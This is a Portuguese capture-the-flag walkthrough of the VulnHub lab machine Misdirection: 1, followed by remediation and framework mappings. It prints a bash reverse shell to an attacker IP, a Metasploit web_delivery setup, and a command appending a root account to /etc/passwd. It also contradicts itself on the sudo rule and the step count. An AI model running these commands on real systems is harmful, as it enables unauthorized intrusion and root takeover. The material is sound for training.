# Misdirection: 1 — A Porta Real Nunca Foi a Porta 80

Olha esse box, mano! A máquina literalmente te conta o tema no nome: tudo que é óbvio é falso, e a superfície de ataque real está se escondendo às claras. Misdirection: 1 encadeia um shell PHP de debug em porta não-padrão com um movimento lateral via sudo, depois explora um /etc/passwd com permissão de escrita para o mundo para plantar uma conta root. O "misdirection" (misdirection = desvio de atenção) é real: a porta 80 roda um Rocket httpd inofensivo enquanto a entrada real está na porta 8080. Clássico truque bom-e-bonito. Design top demais.

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | Misdirection: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/misdirection-1,371/ |
| **Técnicas** | Enumeração multi-porta, exploração de shell virtual PHP de debug, Metasploit web_delivery, movimento lateral via sudo, injeção em /etc/passwd com permissão de escrita |
| **CVEs** | CWE-94 (Controle Impróprio de Geração de Código — RCE shell de debug), CWE-732 (Atribuição Incorreta de Permissão — /etc/passwd com permissão global de escrita), CWE-269 (Gerenciamento Impróprio de Privilégios — sudo NOPASSWD movimento lateral) |
| **Grupos APT** | APT41: aproveita consoles de debug/admin expostos como acesso inicial em ambientes cloud; Lazarus Group: usa regras sudo mal configuradas extensivamente em fases de movimento lateral pós-exploração |

---

## Resumo do Ataque

```
netdiscover → nmap -A → portas 22, 80, 3306, 8080
  → porta 80: Rocket httpd (engodo/rabbit hole)
  → porta 8080: Apache → dirb → /debug shell virtual PHP
  → Metasploit web_delivery payload PHP
  → colar one-liner no /debug → Meterpreter www-data
  → shell → python pty spawn
  → sudo -l → (root) NOPASSWD: /bin/bash como brexit
  → sudo -u brexit /bin/bash → uid=1000(brexit)
  → ls -la /etc/passwd → -rw-rw-r-- (brexit tem escrita de grupo)
  → openssl passwd → hash
  → echo 'raj:HASH:0:0::/root:/bin/bash' >> /etc/passwd
  → su raj → uid=0(root)
  → /root/root.txt
```

---

## Metodologia

1. Descoberta de rede e scan completo de portas
2. Identificar o engodo: porta 80 é isca, porta 8080 é o alvo real
3. Brute-force de diretórios na porta 8080 para encontrar o shell virtual /debug
4. Entregar reverse shell Meterpreter via Metasploit web_delivery
5. Movimento lateral via sudo NOPASSWD: executar /bin/bash como brexit
6. Descobrir /etc/passwd com permissão de escrita de grupo (brexit)
7. Injetar usuário root-equivalente em /etc/passwd
8. Mudar para usuário injetado, ler flag root

---

## Passo 1 — Descoberta de Rede e Scan Completo de Portas

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
# Alvo: 192.168.1.106

nmap -sV -sC -A 192.168.1.106
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.x
80/tcp   open  http    Rocket httpd
3306/tcp open  mysql   MySQL 5.x
8080/tcp open  http    Apache httpd 2.4.x
```

Quatro serviços. A porta 80 é a isca: o Rocket httpd na porta 80 serve uma página web genérica sem conteúdo útil. A porta 8080 é a instalação Apache real e a superfície de ataque de verdade.

**Nota real:** Engodos na porta 80 são incomuns mas não raros em engajamentos de red team. A lição: não pare depois de encontrar um serviço HTTP. Enumere todas as portas, depois enumere todos os serviços HTTP. Véi, tem gente que teria desistido aqui.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede; T1571 — Porta Não-Padrão

---

## Passo 2 — Brute-Force de Diretórios na Porta 8080

```bash
dirb http://192.168.1.106:8080/
# Alternativa: gobuster dir -u http://192.168.1.106:8080/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -t 30
```

Caminhos descobertos:
- `/debug` — shell virtual PHP interativo (o jackpot)
- `/wordpress` — instalação WordPress (rabbit hole / caça de credenciais)
- `/shell` — outro endpoint de shell

O caminho `/debug` expõe um shell PHP interativo rodando diretamente no navegador. Aceita código PHP e retorna a saída. Sem autenticação necessária. Isso é um artefato de debug de desenvolvimento deixado em produção. Mano, caramba.

**Nota real:** Consoles de debug (Werkzeug, shells PHP, notebooks Jupyter, endpoints Spring Boot Actuator) deixados acessíveis em produção são uma classe crítica de vulnerabilidade. APT41 especificamente caça consoles Werkzeug e Jupyter expostos usando Shodan e censys antes de exploração inicial.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1190 — Exploração de Aplicação Pública

---

## Passo 3 — Reverse Shell via Metasploit web_delivery

Configure o multi-handler e módulo web_delivery do Metasploit para gerar e servir um payload PHP de reverse shell:

```bash
msfconsole

use exploit/multi/script/web_delivery
set TARGET 1          # alvo PHP
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.105
set LPORT 4444
exploit
```

O Metasploit gera um one-liner PHP para executar. Copie esse one-liner e cole no shell do navegador `/debug`. Uma sessão Meterpreter abre como `www-data`.

**Alternativa (reverse shell netcat manual sem Metasploit):**

```php
# No shell /debug:
system('bash -c "bash -i >& /dev/tcp/192.168.1.105/4444 0>&1"');
```

```bash
# Listener no atacante:
nc -lvnp 4444
```

**MITRE ATT&CK:** T1059.004 — Interpretador de Comando e Script: Unix Shell

---

## Passo 4 — Estabilização de Shell e Movimento Lateral via sudo

Caia em um shell nativo e estabilize:

```bash
# Do Meterpreter:
sessions -i 1
shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Verifique direitos sudo:
sudo -l
```

Saída:
```
User www-data may run the following commands:
  (brexit) NOPASSWD: /bin/bash
```

Essa regra sudo permite que `www-data` execute `/bin/bash` como usuário `brexit` sem senha. Isso é um movimento lateral, não uma escalada direta para root.

```bash
sudo -u brexit /bin/bash
id
# uid=1000(brexit) gid=1000(brexit) groups=1000(brexit)
```

Agora operando como `brexit`. Esse usuário tem acesso de escrita de grupo ao /etc/passwd. Sensacional, bora rapaziada!

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Controle de Elevação: Sudo; T1078 — Contas Válidas

---

## Passo 5 — /etc/passwd Gravável: Injeção de Usuário Root

Verifique permissões do /etc/passwd:

```bash
ls -la /etc/passwd
# -rw-rw-r-- 1 root brexit 1679 ... /etc/passwd
```

O arquivo é de propriedade do grupo `brexit` com permissões de escrita de grupo. Como `brexit`, podemos modificar /etc/passwd diretamente.

Gere um hash de senha:

```bash
openssl passwd -1 -salt user3 pass123
# $1$user3$rAGRVf5p2jYTqtqOW5cPu/
```

Adicione um usuário root-equivalente ao /etc/passwd:

```bash
echo 'raj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash' >> /etc/passwd
tail -3 /etc/passwd
```

**MITRE ATT&CK:** T1136.001 — Criar Conta: Conta Local

---

## Passo 6 — Root

```bash
su raj
# Senha: pass123

id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat root.txt
```

Gg, root alcançado. Top demais! (❍ᴥ❍ʋ)

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Shell de debug | /debug na porta 8080 | Enumeração dirb | RCE PHP → Meterpreter |
| Regra sudo | www-data → brexit NOPASSWD /bin/bash | sudo -l | Movimento lateral para brexit |
| Credencial injetada | raj:pass123 | /etc/passwd (adicionado) | su para root |
| Flag root | (conteúdo de /root/root.txt) | /root/root.txt | Objetivo final |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | Endpoints de debug/shell acessíveis em produção | Shells virtuais PHP, consoles Werkzeug e notebooks Jupyter implantados em produção são diretamente exploráveis sem autenticação | Remova todos os utensílios de debug antes do deployment; use flags de ambiente para impedir modo debug em produção |
| 2 | Movimento lateral sudo NOPASSWD concede acesso a usuário com maior privilégio | Regras sudo que movem entre usuários (não apenas para root) podem encadear para acesso root indiretamente | Audite todas as regras sudo: qualquer concessão NOPASSWD para um binário de shell é um caminho de escalada de privilégios |
| 3 | /etc/passwd com permissão de escrita de grupo para usuário não-root | Qualquer processo rodando como esse grupo pode injetar contas UID-0; isso equivale a acesso root | /etc/passwd deve ter permissão 644 de propriedade root:root; verifique com `stat /etc/passwd` |
| 4 | Serviços HTTP multi-porta: um é engodo, um é real | Atacantes enumeram todas as portas; defensores devem proteger todos os endpoints HTTP, não apenas porta 80/443 | Fortaleça todos os serviços HTTP; trate todo serviço exposto como superfície de ataque potencial |
| 5 | Cadeia de ataque de shell debug a root em 4 passos | Todo esse comprometimento acontece em menos de 5 minutos com ferramentas comuns; sem CVEs necessários, apenas más configurações | Defesa em profundidade: remova endpoints debug, restrinja sudo e proteja /etc/passwd |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicação Pública (shell debug) | T1190 |
| Execução | Execução | Interpretador de Comando e Script: Unix Shell | T1059.004 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Abuso de Controle de Elevação: Sudo (movimento lateral) | T1548.003 |
| Escalonamento de Privilégios | Escalonamento de Privilégios | Criar Conta: Conta Local (injeção /etc/passwd) | T1136.001 |
| Evasão de Defesa | Evasão de Defesa | Porta Não-Padrão (porta 8080 para alvo real) | T1571 |
| Movimento Lateral | Movimento Lateral | Contas Válidas (sudo -u brexit) | T1078 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remova todos os endpoints de debug da produção**: `/debug`, `/shell` e caminhos similares não devem existir em servidores de produção; use configuração específica de ambiente para controlar ferramentas de debug
2. **Audite regras sudo**: `grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/`; remova qualquer regra que conceda comandos com capacidade de shell-escape com NOPASSWD
3. **Corrija permissões do /etc/passwd**: `chmod 644 /etc/passwd; chown root:root /etc/passwd`; monitore /etc/passwd para modificações não autorizadas
4. **Proteja a porta 8080**: se Apache na porta 8080 for necessário, aplique o mesmo fortalecimento que na porta 80; remova artefatos de desenvolvimento
5. **Implemente monitoramento de integridade de arquivo**: alerte sobre modificações em /etc/passwd, /etc/shadow e /etc/sudoers

### Contramedidas MITRE D3FEND

- **D3-ACH** — Fortalecimento de Configuração de Aplicação: desabilite modo debug em produção; aplique flags de ambiente de produção
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional: audite regras sudo; corrija permissões do /etc/passwd
- **D3-FIM** — Monitoramento de Integridade de Arquivo: alerte sobre modificações do /etc/passwd em tempo real

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os serviços HTTP em todas as portas; catalogar regras sudo em todos os hosts |
| Proteger | Controle de Acesso | Remover endpoints de debug; corrigir permissões do /etc/passwd; restringir sudo |
| Proteger | Gerenciamento de Identidade | Exigir senhas para todas as escaladas sudo; sem NOPASSWD para binários de shell |
| Detectar | Anomalias e Eventos | Alertar sobre modificação do /etc/passwd; alertar sobre acesso ao console de debug |
| Responder | Planejamento de Resposta | Remover contas injetadas; rotacionar credenciais; desabilitar endpoints de debug |
| Recuperar | Planejamento de Recuperação | Reconstruir host afetado; auditar todas as contas e regras sudo |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| CM-7 | Funcionalidade Mínima | Remover endpoints de debug de deployments de produção |
| AC-6 | Menor Privilégio | Restringir regras sudo; sem NOPASSWD para binários de shell |
| AC-3 | Aplicação de Acesso | Definir /etc/passwd como 644 root:root; prevenir escritas não autorizadas |
| SI-7 | Integridade de Software, Firmware e Informação | Monitorar /etc/passwd com monitoramento de integridade de arquivo |
| IA-2(1) | Autenticação Multi-Fator | Exigir MFA para todo acesso administrativo a aplicações web |
| CM-6 | Configurações | Aplicar padrões de configuração de produção que desabilitem modo debug |

### CISA KEV

Consoles de debug expostos (Werkzeug, phpinfo, Spring Boot Actuator) aparecem em múltiplas entradas e avisos do catálogo de Vulnerabilidades Exploradas Conhecidas da CISA. CISA AA22-074A especificamente nota que atores de ameaça escaneiam interfaces de debug expostas como técnica de acesso inicial. Organizações devem priorizar a remoção de endpoints de debug de sistemas voltados para a internet.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ativo, Mudança e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI e OT | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas (auditoria sudo, permissões /etc/passwd) | MIL3 |
| Consciência Situacional (SITUATION) | Monitorar Eventos (FIM no /etc/passwd) | MIL2 |

---

## Considerações Finais

Misdirection: 1 entrega exatamente o que o nome promete. O engodo da porta 80 é uma escolha de design pequena mas efetiva: força o atacante a pensar sobre o que está olhando em vez de simplesmente avançar para o primeiro serviço HTTP que encontrar.

A má configuração do /etc/passwd é um clássico que aparece em ambientes reais com muito mais frequência do que deveria. Combine com um movimento lateral via sudo e um shell de debug, e você tem um comprometimento root em três passos sem nenhum CVE necessário.

Este box é uma ótima lição sobre a diferença entre exploração e abuso de má configuração. Sem buffer overflows, sem ROP chains: apenas padrões ruins e permissões fracas. As vulnerabilidades mais perigosas são frequentemente as que vêm com o box. Bora rapaziada!

Thanks guys!! (❍ᴥ❍ʋ)
